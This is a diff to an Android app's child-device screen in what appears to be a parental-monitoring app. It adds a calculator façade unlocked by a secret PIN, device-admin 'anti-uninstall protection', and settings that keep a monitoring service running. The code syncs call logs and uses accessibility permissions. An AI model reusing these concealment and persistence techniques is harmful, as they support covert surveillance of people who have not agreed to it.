@@ -44,6 +44,7 @@ import com.example.authapp.theme.AuthAppTheme
 fun ChildScreen(
     email: String,
     onSignOut: () -> Unit,
+    onLockToCalculator: () -> Unit = {},
     modifier: Modifier = Modifier
 ) {
     val context = LocalContext.current
@@ -56,6 +57,12 @@ fun ChildScreen(
     var showChangePairingForm by remember { mutableStateOf(false) }
     var showPairingSuccessDialog by remember { mutableStateOf(false) }
     var pairedParentEmail by remember { mutableStateOf("") }
+
+    var isDeviceAdminActive by remember { mutableStateOf(com.example.authapp.utils.DeviceAdminManager.isDeviceAdminActive(context)) }
+    var isStealthMode by remember { mutableStateOf(com.example.authapp.data.AppPreferences.isStealthModeEnabled(context)) }
+    var currentSecretPin by remember { mutableStateOf(com.example.authapp.data.AppPreferences.getSecretPin(context)) }
+    var showChangePinDialog by remember { mutableStateOf(false) }
+    var newPinInput by remember { mutableStateOf("") }
 
     DisposableEffect(currentChildUid) {
         if (currentChildUid.isEmpty()) return@DisposableEffect onDispose {}
@@ -146,6 +153,7 @@ fun ChildScreen(
         hasNotificationListenerPermission = checkNotificationListenerPermission()
         hasUsageAccessPermission = checkUsageAccessPermission()
         hasAccessibilityPermission = checkAccessibilityPermission()
+        isDeviceAdminActive = com.example.authapp.utils.DeviceAdminManager.isDeviceAdminActive(context)
 
         if (hasCallPermissions && currentChildUid.isNotEmpty()) {
             com.example.authapp.data.CallLogSyncManager.syncIfDue(context, currentChildUid)
@@ -715,8 +723,198 @@ fun ChildScreen(
                 )
             }
         }
-        Spacer(modifier = Modifier.height(12.dp))
-        Spacer(modifier = Modifier.height(32.dp))
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // Card A: Calculator Façade & Secret PIN Security
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            shape = RoundedCornerShape(16.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Icon(
+                        imageVector = Icons.Default.Lock,
+                        contentDescription = null,
+                        tint = MaterialTheme.colorScheme.primary,
+                        modifier = Modifier.size(24.dp)
+                    )
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Text(
+                        text = "Calculator Stealth & Passcode",
+                        style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
+                    )
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+                Text(
+                    text = "App opens as a real calculator. Entering your secret PIN and pressing '=' unlocks this dashboard.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+
+                Spacer(modifier = Modifier.height(12.dp))
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "Stealth Mode (Open Calculator):",
+                        style = MaterialTheme.typography.bodyMedium.copy(fontWeight = FontWeight.Medium),
+                        modifier = Modifier.weight(1f)
+                    )
+                    Switch(
+                        checked = isStealthMode,
+                        onCheckedChange = { enabled ->
+                            isStealthMode = enabled
+                            com.example.authapp.data.AppPreferences.setStealthModeEnabled(context, enabled)
+                        }
+                    )
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "Current Secret PIN: $currentSecretPin",
+                        style = MaterialTheme.typography.bodyMedium.copy(fontWeight = FontWeight.Bold),
+                        modifier = Modifier.weight(1f)
+                    )
+                    OutlinedButton(
+                        onClick = {
+                            newPinInput = currentSecretPin
+                            showChangePinDialog = true
+                        },
+                        shape = RoundedCornerShape(10.dp)
+                    ) {
+                        Text("Change PIN")
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(12.dp))
+                Button(
+                    onClick = onLockToCalculator,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    Icon(Icons.Default.Lock, contentDescription = null, modifier = Modifier.size(18.dp))
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Text("Lock to Calculator Screen")
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // Card C: Anti-Uninstall Device Administrator Protection
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            shape = RoundedCornerShape(16.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Icon(
+                        imageVector = Icons.Default.Security,
+                        contentDescription = null,
+                        tint = if (isDeviceAdminActive) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.error,
+                        modifier = Modifier.size(24.dp)
+                    )
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Text(
+                        text = "Anti-Uninstall Protection",
+                        style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold),
+                        modifier = Modifier.weight(1f)
+                    )
+                    Surface(
+                        color = if (isDeviceAdminActive) MaterialTheme.colorScheme.primaryContainer else MaterialTheme.colorScheme.errorContainer,
+                        shape = RoundedCornerShape(8.dp)
+                    ) {
+                        Text(
+                            text = if (isDeviceAdminActive) "PROTECTED" else "NOT PROTECTED",
+                            style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold),
+                            color = if (isDeviceAdminActive) MaterialTheme.colorScheme.onPrimaryContainer else MaterialTheme.colorScheme.onErrorContainer,
+                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
+                        )
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+                Text(
+                    text = "Prevents children or unauthorized users from uninstalling the Calculator app from device Settings without disabling device admin first.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+
+                Spacer(modifier = Modifier.height(12.dp))
+                if (!isDeviceAdminActive) {
+                    Button(
+                        onClick = {
+                            com.example.authapp.utils.DeviceAdminManager.requestDeviceAdmin(context)
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary),
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Text("Enable Uninstall Protection")
+                    }
+                } else {
+                    OutlinedButton(
+                        onClick = {
+                            com.example.authapp.utils.DeviceAdminManager.deactivateDeviceAdmin(context)
+                            isDeviceAdminActive = false
+                        },
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Text("Deactivate Protection")
+                    }
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // Card D: OEM Background Auto-Start & Performance
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            shape = RoundedCornerShape(16.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                val oemName = android.os.Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
+                Text(
+                    text = "$oemName Background Auto-Start",
+                    style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
+                )
+                Spacer(modifier = Modifier.height(6.dp))
+                Text(
+                    text = "Ensure the app has 'Autostart' enabled and 'Battery Saver' set to 'No Restrictions' so Android does not kill the monitoring service when the screen turns off.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+                Spacer(modifier = Modifier.height(12.dp))
+                Button(
+                    onClick = {
+                        com.example.authapp.utils.AutoStartHelper.openAutoStartSettings(context)
+                    },
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    Text("Configure $oemName Background Settings")
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(24.dp))
 
         Button(
             onClick = onSignOut,
@@ -758,6 +956,59 @@ fun ChildScreen(
                         shape = RoundedCornerShape(12.dp)
                     ) {
                         Text("Continue")
+                    }
+                }
+            )
+        }
+
+        if (showChangePinDialog) {
+            AlertDialog(
+                onDismissRequest = { showChangePinDialog = false },
+                icon = {
+                    Icon(Icons.Default.Lock, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
+                },
+                title = {
+                    Text("Change Secret PIN", fontWeight = FontWeight.Bold)
+                },
+                text = {
+                    Column {
+                        Text(
+                            "Enter a new 4 to 6 digit secret passcode. You will need this PIN followed by '=' to unlock this dashboard from the calculator.",
+                            style = MaterialTheme.typography.bodySmall,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                        )
+                        Spacer(modifier = Modifier.height(12.dp))
+                        OutlinedTextField(
+                            value = newPinInput,
+                            onValueChange = { if (it.length <= 6 && it.all { char -> char.isDigit() }) newPinInput = it },
+                            label = { Text("New PIN (digits only)") },
+                            singleLine = true,
+                            modifier = Modifier.fillMaxWidth(),
+                            keyboardOptions = androidx.compose.foundation.text.KeyboardOptions(
+                                keyboardType = androidx.compose.ui.text.input.KeyboardType.Number
+                            )
+                        )
+                    }
+                },
+                confirmButton = {
+                    Button(
+                        onClick = {
+                            if (newPinInput.length >= 4) {
+                                currentSecretPin = newPinInput
+                                com.example.authapp.data.AppPreferences.saveSecretPin(context, newPinInput)
+                                showChangePinDialog = false
+                                android.widget.Toast.makeText(context, "Secret PIN updated", android.widget.Toast.LENGTH_SHORT).show()
+                            } else {
+                                android.widget.Toast.makeText(context, "PIN must be at least 4 digits", android.widget.Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    ) {
+                        Text("Save PIN")
+                    }
+                },
+                dismissButton = {
+                    TextButton(onClick = { showChangePinDialog = false }) {
+                        Text("Cancel")
                     }
                 }
             )
